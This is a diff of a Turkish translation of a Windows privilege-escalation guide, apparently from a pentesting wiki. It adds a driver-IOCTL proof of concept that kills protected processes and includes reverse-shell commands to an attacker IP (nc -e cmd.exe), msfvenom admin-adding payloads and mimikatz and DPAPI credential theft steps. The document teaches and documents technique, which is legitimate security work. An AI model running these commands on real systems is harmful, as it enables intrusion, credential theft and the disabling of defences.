 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -423,19 +422,19 @@ todos %username%" && echo.
 ```
 ### Memory Password mining
 
-Çalışan bir sürecin bellek dökümünü sysinternals'tan **procdump** kullanarak oluşturabilirsiniz. FTP gibi servislerde **credentials in clear text in memory** bulunur; belleği döküp bu credentials'ları okumayı deneyin.
+Çalışan bir sürecin bellek dökümünü sysinternals'dan **procdump** kullanarak oluşturabilirsiniz. FTP gibi servislerde bellekte **credentials in clear text in memory** bulunur; belleği döküp credentials'ları okuyun.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
 ### Güvensiz GUI uygulamaları
 
-**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlerde gezmesine izin verebilir.**
+**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**
 
-Örnek: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
+Örnek: "Windows Help and Support" (Windows + F1), "command prompt" arayın, "Click to open Command Prompt"e tıklayın
 
 ## Servisler
 
-Servislerin listesini alın:
+Servislerin listesini al:
 ```bash
 net start
 wmic service list brief
@@ -448,11 +447,11 @@ Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
 ```bash
 sc qc <service_name>
 ```
-Her servis için gereken yetki seviyesini kontrol etmek amacıyla _Sysinternals_'den **accesschk** ikili dosyasına sahip olmak önerilir.
+Her servis için gerekli ayrıcalık seviyesini kontrol etmek üzere _Sysinternals_'ten **accesschk** ikili dosyasına sahip olmak önerilir.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
-"Authenticated Users"ın herhangi bir servisi değiştirebilip değiştiremeyeceğini kontrol etmeniz önerilir:
+“Authenticated Users”'in herhangi bir servisi değiştirebilip değiştiremeyeceğinin kontrol edilmesi önerilir:
 ```bash
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv %USERNAME% * /accepteula
@@ -463,25 +462,25 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 ### Servisi etkinleştirme
 
-Eğer bu hatayla karşılaşıyorsanız (örneğin SSDPSRV ile):
+Bu hatayı alıyorsanız (örneğin SSDPSRV ile):
 
 _System error 1058 has occurred._\
 _The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
 
-Bunu etkinleştirmek için şu komutu kullanabilirsiniz:
+Bunu etkinleştirmek için şunu kullanabilirsiniz:
 ```bash
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
-**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**
+**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**
 
-**Bu problemin başka bir çözümü** şunu çalıştırmaktır:
+**Bu sorunun başka bir çözümü** şu komutu çalıştırmaktır:
 ```
 sc.exe config usosvc start= auto
 ```
 ### **Modify service binary path**
 
-Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu durumda, servisin yürütülebilir ikili dosyası değiştirilebilir. Değiştirmek ve **sc**'yi çalıştırmak için:
+Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary'sini değiştirmek mümkündür. Değiştirmek ve çalıştırmak için **sc**:
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
@@ -496,18 +495,18 @@ net stop [service name] && net start [service name]
 ```
 Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:
 
-- **SERVICE_CHANGE_CONFIG**: Servis binary'sini yeniden yapılandırma imkanı verir.
-- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar; bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
-- **WRITE_OWNER**: Sahipliği devralma ve izinleri yeniden yapılandırma yetkisi verir.
-- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yetkisini verir.
-- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yetkisini verir.
+- **SERVICE_CHANGE_CONFIG**: Servisin çalıştırdığı ikili dosyanın yeniden yapılandırılmasına izin verir.
+- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasına olanak sağlar; bu da servis yapılandırmalarını değiştirme yeteneği verir.
+- **WRITE_OWNER**: Sahiplik devralma ve izinlerin yeniden yapılandırılmasına izin verir.
+- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğine sahiptir.
+- **GENERIC_ALL**: Aynı şekilde servis yapılandırmalarını değiştirme yeteneğine sahiptir.
 
-Bu zafiyetin tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.
+Bu zafiyetin tespiti ve sömürüsü için _exploit/windows/local/service_permissions_ kullanılabilir.
 
-### Servis binaries için zayıf izinler
+### Services binaries weak permissions
 
-**Servis tarafından çalıştırılan binary'yi değiştirebilip değiştiremeyeceğinizi** veya binary'nin bulunduğu klasörde **yazma izinlerinizin olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
-Servis tarafından çalıştırılan tüm binary'leri **wmic** (system32'de olmayanları) ile alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
+**Bir servis tarafından çalıştırılan ikili dosyayı değiştirebilir misiniz** veya ikili dosyanın bulunduğu klasörde **yazma izniniz var mı** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
+Bir servisin çalıştırdığı tüm ikili dosyaları **wmic** ile (system32'de olmayanlar) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
@@ -519,10 +518,10 @@ sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-### Servis kayıt defteri düzenleme izinleri
+### Servis kayıt defteri değiştirme izinleri
 
 Herhangi bir servis kayıt defterini değiştirebilip değiştiremeyeceğinizi kontrol etmelisiniz.\
-Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol edebilirsiniz**:
+Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol** etmek için şunu yapabilirsiniz:
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
@@ -531,15 +530,15 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.
+**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer sahipse, servis tarafından çalıştırılan binary değiştirilebilir.
 
-Çalıştırılan binary'nin `Path`'ini değiştirmek için:
+Servis tarafından çalıştırılan binary'nin Path'ini değiştirmek için:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 ### Services registry AppendData/AddSubdirectory izinleri
 
-Eğer bir registry üzerinde bu izne sahipseniz, **bu registry'den alt registry'ler oluşturabilirsiniz**. Windows servisleri durumunda bu, **herhangi bir kodu çalıştırmak için yeterlidir:**
+Eğer bir registry üzerinde bu izne sahipseniz bu, **bu kayıttan alt kayıtlar oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **herhangi bir kodu çalıştırmak için yeterlidir:**
 
 
 {{#ref}}
@@ -548,15 +547,15 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 
 ### Unquoted Service Paths
 
-Bir executable yolunun tırnak içinde olmaması durumunda, Windows boşluktan önceki her parçayı çalıştırmayı dener.
+Eğer bir çalıştırılabilir dosyanın yolu tırnak içinde değilse, Windows boşluktan önceki her parçayı çalıştırmayı deneyecektir.
 
-Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şu dosyaları çalıştırmayı dener:
+For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
 ```bash
 C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
-Yerleşik Windows hizmetlerine ait olanlar hariç, tüm tırnaklanmamış hizmet yollarını listeleyin:
+Yerleşik Windows hizmetlerine ait olmayan tüm tırnaklanmamış hizmet yollarını listele:
 ```bash
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services
@@ -576,19 +575,19 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 ```bash
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
-**Bu zafiyeti tespit edip exploit edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` metasploit ile servis binary'sini manuel olarak oluşturabilirsiniz:
+**Bu zafiyeti tespit edip exploit edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` Manuel olarak metasploit ile bir service binary oluşturabilirsiniz:
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
 ### Kurtarma Eylemleri
 
-Windows, bir servis başarısız olduğunda yapılacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'yi işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla detay [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
+Windows, bir servis başarısız olduğunda alınacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
 ## Uygulamalar
 
 ### Yüklü Uygulamalar
 
-Kontrol edin: **permissions of the binaries** (belki birinin üzerine yazıp privilege escalation gerçekleştirebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
+Kontrol edin **permissions of the binaries** (maybe you can overwrite one and escalate privileges) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -599,7 +598,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 ### Yazma İzinleri
 
-Bazı özel dosyaları okumak için bir config dosyasını değiştirebilir misiniz ya da Administrator account (schedtasks) tarafından çalıştırılacak bir binary'i değiştirebilir misiniz diye kontrol edin.
+Bazı özel dosyaları okumak için bazı config file'ları değiştirebilip değiştiremeyeceğinizi veya Administrator hesabı (schedtasks) tarafından çalıştırılacak bir binary'i değiştirebilip değiştiremeyeceğinizi kontrol edin.
 
 Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
 ```bash
@@ -624,10 +623,10 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
 ```
-### Başlangıçta çalıştırma
+### Başlangıçta çalıştır
 
-**Farklı bir user tarafından çalıştırılacak bazı registry veya binary dosyalarını overwrite edip edemeyeceğinizi kontrol edin.**\
-**Aşağıdaki sayfayı okuyun** ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için:
+**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry veya binary dosyalarını üzerine yazıp yazamayacağınızı kontrol edin.**\
+**Okuyun** ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı**:
 
 
 {{#ref}}
@@ -636,37 +635,69 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Sürücüler
 
-Olası üçüncü taraf tuhaf/zafiyetli sürücüleri arayın
+Olası **third party weird/vulnerable** sürücüleri arayın
 ```bash
 driverquery
 driverquery.exe /fo table
 driverquery /SI
 ```
-Eğer bir driver arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers) açığa çıkarıyorsa, doğrudan kernel memory'den bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için buraya bakın:
+Eğer bir driver arbitrary kernel read/write primitive (kötü tasarlanmış IOCTL handlers'ta yaygın) açığa çıkarıyorsa, kernel memory'den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için bakın:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
+#### device objects üzerindeki eksik FILE_DEVICE_SECURE_OPEN'un kötüye kullanılması (LPE + EDR kill)
+
+Bazı signed third‑party driver'lar device object'larını IoCreateDeviceSecure ile güçlü bir SDDL kullanarak oluşturuyor ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u ayarlamayı unutuyorlar. Bu bayrak olmadan, secure DACL, cihaz ekstra bir bileşen içeren bir yol ile açıldığında uygulanmıyor; bu da herhangi bir ayrıcalıksız kullanıcının aşağıdaki gibi bir namespace path kullanarak bir handle elde etmesine izin veriyor:
+
+- \\ .\\DeviceName\\anything
+- \\ .\\amsdk\\anyfile (gerçek bir vaka örneğinden)
+
+Bir kullanıcı cihazı açabildiğinde, driver tarafından expose edilen privileged IOCTLs LPE ve tampering için kötüye kullanılabilir. Vahşi ortamda gözlemlenen örnek yetenekler:
+- Arbitrary process'lere full-access handle döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
+- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence tricks).
+- Arbitrary process'leri sonlandırma, Protected Process/Light (PP/PPL) dahil, bu da AV/EDR'nin user land'den kernel aracılığıyla kill edilmesine olanak tanır.
+
+Minimal PoC pattern (user mode):
+```c
+// Example based on a vulnerable antimalware driver
+#define IOCTL_REGISTER_PROCESS  0x80002010
+#define IOCTL_TERMINATE_PROCESS 0x80002048
+
+HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
+DWORD me = GetCurrentProcessId();
+DWORD target = /* PID to kill or open */;
+DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
+DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
+```
+Geliştiriciler için Önlemler
+- DACL ile kısıtlanması amaçlanan aygıt nesneleri oluştururken her zaman FILE_DEVICE_SECURE_OPEN'ı ayarlayın.
+- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırma veya handle geri verilmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
+- IOCTLs'i (access masks, METHOD_*, girdi doğrulaması) sınırlandırın ve doğrudan kernel ayrıcalıkları yerine arabulucu modelleri düşünün.
+
+Savunucular için Tespit Fikirleri
+- Şüpheli aygıt adlarının (ör. \\ .\\amsdk*) user-mode tarafından yapılan açılışlarını ve kötüye kullanımı işaret eden belirli IOCTL dizilerini izleyin.
+- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny listelerinizi yönetin.
+
 
 ## PATH DLL Hijacking
 
-Eğer **PATH üzerinde bulunan bir klasör içinde yazma izinleriniz** varsa, bir süreç tarafından yüklenen bir DLL'i kaçırarak **yetki yükseltebilirsiniz**.
+Eğer **PATH üzerinde bulunan bir klasörde yazma izinleriniz** varsa, bir işlem tarafından yüklenen bir DLL'i ele geçirerek **ayrıcalıkları yükseltebilirsiniz**.
 
 PATH içindeki tüm klasörlerin izinlerini kontrol edin:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Bu kontrolü nasıl kötüye kullanacağınız konusunda daha fazla bilgi için:
-
+Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:
 
 {{#ref}}
 dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
 {{#endref}}
 
-## Network
+## Ağ
 
-### Shares
+### Paylaşımlar
 ```bash
 net view #Get a list of computers
 net view /all /domain [domainname] #Shares on the domains
@@ -676,7 +707,7 @@ net share #Check current shares
 ```
 ### hosts file
 
-hosts file içinde hardcoded olarak bulunan diğer bilinen bilgisayarları kontrol edin
+hosts file üzerinde sert kodlanmış diğer bilinen bilgisayarları kontrol edin
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -686,9 +717,9 @@ ipconfig /all
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
-### Open Ports
+### Açık Portlar
 
-Dışarıdan **restricted services**'ı kontrol edin
+Dışarıdan **kısıtlı servisleri** kontrol edin
 ```bash
 netstat -ano #Opened ports?
 ```
@@ -702,7 +733,7 @@ Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIn
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
-### Firewall Rules
+### Firewall Kuralları
 
 [**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**
 
@@ -713,18 +744,18 @@ Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.m
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
 ```
-İkili `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde de bulunabilir
+`bash.exe` ikili dosyası ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir
 
-Eğer root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (ilk kez bir portu dinlemek için `nc.exe` kullandığınızda GUI, `nc`'nin güvenlik duvarı tarafından izin verilmesini isteyecektir).
+Root kullanıcı haklarına erişirseniz herhangi bir porta dinleyici açabilirsiniz (ilk kez `nc.exe` ile bir porta dinleyici açtığınızda, GUI üzerinden `nc`'nin firewall tarafından izinli olup olmayacağı sorulur).
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
 wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
-bash'ı root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz.
+bash'i kolayca root olarak başlatmak için `--default-user root` deneyebilirsiniz
 
-`WSL` dosya sistemini şu klasörde inceleyebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
+`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz
 
 ## Windows Kimlik Bilgileri
 
@@ -740,16 +771,16 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
-### Credentials manager / Windows vault
+### Kimlik bilgileri yöneticisi / Windows vault
 
-From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Windows Vault, **Windows**'un kullanıcıları otomatik olarak oturum açtırabildiği sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini tarayıcılar aracılığıyla otomatik giriş yapmak için saklayabildiği gibi görünebilir. Ancak durum böyle değildir.
+From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
+Windows Vault, sunucular, web siteleri ve diğer programlar için **Windows**'un **kullanıcıları otomatik olarak oturum açtırmasını sağlayan** kimlik bilgilerini depolar. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini tarayıcılar aracılığıyla otomatik giriş için saklayabildiği gibi görünebilir. Ancak durum böyle değildir.
 
-Windows Vault, **Windows**'un kullanıcıları otomatik olarak oturum açtırabildiği kimlik bilgilerini depolar; bu da herhangi bir **kaynağa (sunucu veya bir web sitesi) erişmek için kimlik bilgisine ihtiyaç duyan Windows uygulamasının** **bu Credential Manager** ve Windows Vault'tan faydalanabileceği ve kullanıcının her seferinde kullanıcı adı ve şifre girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.
+Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar; bu, bir kaynağa (sunucu veya bir web sitesi) erişmek için kimlik bilgisine ihtiyaç duyan herhangi bir **Windows uygulamasının** **bu Credential Manager'dan** ve Windows Vault'tan yararlanabileceği ve sağlanan kimlik bilgilerini kullanıcıların sürekli kullanıcı adı ve şifre girmesi yerine kullanabileceği anlamına gelir.
 
-Uygulamalar Credential Manager ile etkileşime girmedikçe, belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün görünmüyor. Bu yüzden, uygulamanız vault'tan faydalanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini talep etmek üzere bir şekilde **credential manager ile iletişim kurmalıdır**.
+Uygulamalar Credential Manager ile etkileşime girmezse, belirli bir kaynak için kimlik bilgilerini kullanabilmelerinin mümkün olduğunu düşünmüyorum. Bu yüzden, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini talep etmek üzere **credential manager ile iletişim kurup o kaynak için kimlik bilgilerini istemelidir**.
 
-Makinede depolanan kimlik bilgilerini listelemek için `cmdkey`'i kullanın.
+Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
 ```bash
 cmdkey /list
 Currently stored credentials:
@@ -757,28 +788,28 @@ Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
 ```
-Daha sonra kayıtlı kimlik bilgilerini kullanmak için `/savecred` seçeneği ile `runas` kullanabilirsiniz. Aşağıdaki örnek SMB paylaşımı üzerinden uzak bir binary'yi çağırmaktadır.
+Daha sonra kaydedilmiş kimlik bilgilerini kullanmak için `/savecred` seçeneğiyle `runas` kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir ikiliyi çağırıyor.
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Sağlanan kimlik bilgileriyle `runas` kullanma.
+Sağlanan bir credential seti ile `runas` kullanımı.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
-Unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
+Unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) tarafından elde edilebilir.
 
 ### DPAPI
 
-The **Veri Koruma API'si (DPAPI)**, verinin simetrik şifrelenmesi için bir yöntem sağlar; ağırlıklı olarak Windows işletim sistemi içinde, asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli katkı sağlayan bir kullanıcı veya sistem sırrını kullanır.
+The **Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar; ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli katkıda bulunan bir kullanıcı veya sistem sırrını kullanır.
 
-**DPAPI, kullanıcı oturum açma sırlarından türetilen simetrik bir anahtar aracılığıyla anahtarların şifrelenmesine olanak tanır**. Sistem şifrelemesi senaryolarında ise sistemin domain kimlik doğrulama sırlarını kullanır.
+**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. Sistem şifrelemesi senaryolarında, sistemin domain kimlik doğrulama sırlarını kullanır.
 
-Şifrelenmiş kullanıcı RSA anahtarları, DPAPI kullanılarak, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)'ıdır. **DPAPI anahtarı, kullanıcının özel anahtarlarını aynı dosyada koruyan master anahtarla birlikte aynı konumda bulunur**, tipik olarak 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, CMD'de `dir` komutuyla içeriğini listelemenin engellendiğini, ancak PowerShell üzerinden listelenebildiğini belirtmek önemlidir).
+Şifrelenmiş kullanıcı RSA anahtarları, DPAPI kullanılarak, %APPDATA%\Microsoft\Protect\{SID} dizininde saklanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, tipik olarak 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, içeriğinin CMD'de `dir` komutu ile listelenmesinin engellendiğini; ancak PowerShell ile listelenebileceğini not etmek önemlidir.)
 ```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
-Şifresini çözmek için uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey`'i kullanabilirsiniz.
+Doğru argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanarak bunu deşifre edebilirsiniz.
 
 **credentials files protected by the master password** genellikle şu konumlarda bulunur:
 ```bash
@@ -787,9 +818,8 @@ dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak şifreyi çözebilirsiniz.\
-Çok sayıda **DPAPI** **masterkeys**'i **bellek**ten `sekurlsa::dpapi` modülü ile çıkarabilirsiniz (root iseniz).
-
+Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak decrypt edebilirsiniz.\
+`sekurlsa::dpapi` modülüyle (eğer root iseniz) **bellekten** birçok **DPAPI** **masterkeys** çıkarabilirsiniz.
 
 {{#ref}}
 dpapi-extracting-passwords.md
@@ -797,9 +827,9 @@ dpapi-extracting-passwords.md
 
 ### PowerShell Kimlik Bilgileri
 
-**PowerShell kimlik bilgileri** genellikle **scripting** ve otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini kolayca saklamak için kullanılır. Kimlik bilgileri **DPAPI** ile korunur; bu genellikle oluşturuldukları aynı kullanıcı tarafından aynı bilgisayarda çözülebilecekleri anlamına gelir.
+**PowerShell kimlik bilgileri** genellikle scripting ve otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini kolayca saklamak için kullanılır. Kimlik bilgileri **DPAPI** ile korunur; bu da genellikle oluşturuldukları aynı kullanıcı tarafından aynı bilgisayarda çözülebilecekleri anlamına gelir.
 
-Bir PS kimlik bilgisini onu içeren dosyadan **çözmek** için şunu yapabilirsiniz:
+Dosyada bulunan bir PowerShell kimlik bilgisini **çözmek** için şunu yapabilirsiniz:
 ```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -810,7 +840,7 @@ PS C:\htb> $credential.GetNetworkCredential().password
 
 JustAPWD!
 ```
-### Wifi
+### Wi-Fi
 ```bash
 #List saved Wifi using
 netsh wlan show profile
